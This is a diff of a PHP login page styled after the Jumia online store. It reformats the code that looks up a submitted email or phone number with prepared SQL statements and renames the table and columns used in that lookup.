@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 
-<!--lign 27-->
 <head>
     <meta charset="UTF-8">
     <title>Jumia Anniversaire 2023 | Meilleures offres de Téléphones, TVs, Mode, Maison, Beauté et plus</title>
@@ -8,48 +7,31 @@
     <link rel="icon" type="image/ico" sizes="any" href="https://www.jumia.ma/assets_he/favicon.87f00114.ico">
 </head>
 <body>
-    
-<?php 
-require_once 'db/db.php';
-
-$format_non_valide =false;
-
-if (isset($_POST['num_email']) && !empty($_POST['num_email'])) {
-   
-
-    $_POST['num_email'] = trim($_POST['num_email']);
-
-
-    if (filter_var($_POST['num_email'], FILTER_VALIDATE_EMAIL)) {
-        
-        $requet = $bd->prepare('SELECT * FROM client WHERE email=?');
-        $requet->execute([$_POST['num_email']]);
-    } 
- 
-    elseif (preg_match('/^\+?[1-9]\d{1,14}$/', $_POST['num_email'])) {
-
-        $requet = $bd->prepare('SELECT * FROM client WHERE téléphone=?');
-        $requet->execute([$_POST['num_email']]);
-    } else {
-        $format_non_valide=true;
-      
-    }
-
-    if(!$format_non_valide){
-        $resultat = $requet->fetch(PDO::FETCH_ASSOC); 
-    
-    // Vérifie si un résultat a été trouvé ,sinon il faut cree un compt
-    
-    $form_url = $resultat ? "connextion_mote_de_pass.php" : "new_compt_password.php";
-    }
-    
-}
-?>
-
-
-
-
-
+            
+        <?php 
+        require_once 'db/db.php';
+        $format_non_valide =false;
+        if (isset($_POST['num_email']) && !empty($_POST['num_email'])) {
+            $_POST['num_email'] = trim($_POST['num_email']);
+            if (filter_var($_POST['num_email'], FILTER_VALIDATE_EMAIL)) {  
+                $requet = $bd->prepare('SELECT * FROM user WHERE email=?');
+                $requet->execute([$_POST['num_email']]);
+            } 
+            elseif (preg_match('/^\+?[1-9]\d{1,14}$/', $_POST['num_email'])) {
+                $requet = $bd->prepare('SELECT * FROM user WHERE phone=?');
+                $requet->execute([$_POST['num_email']]);
+            } else {
+                $format_non_valide=true;
+            }
+            if(!$format_non_valide){
+                $resultat = $requet->fetch(PDO::FETCH_ASSOC); 
+            
+            // Vérifie si un résultat a été trouvé ,sinon il faut cree un compt
+            
+            $form_url = $resultat ? "connextion_mote_de_pass.php" : "new_compt_password.php";
+            }
+        }
+        ?>
     <div class="cont_connex" style="display: flex; flex-direction: column; height: 100%; width: 480px; margin: 0 auto; min-height: 500px; max-width: 100%; font-family: Roboto, sans-serif;">
         <div style="margin-bottom: 50px;"></div>
 
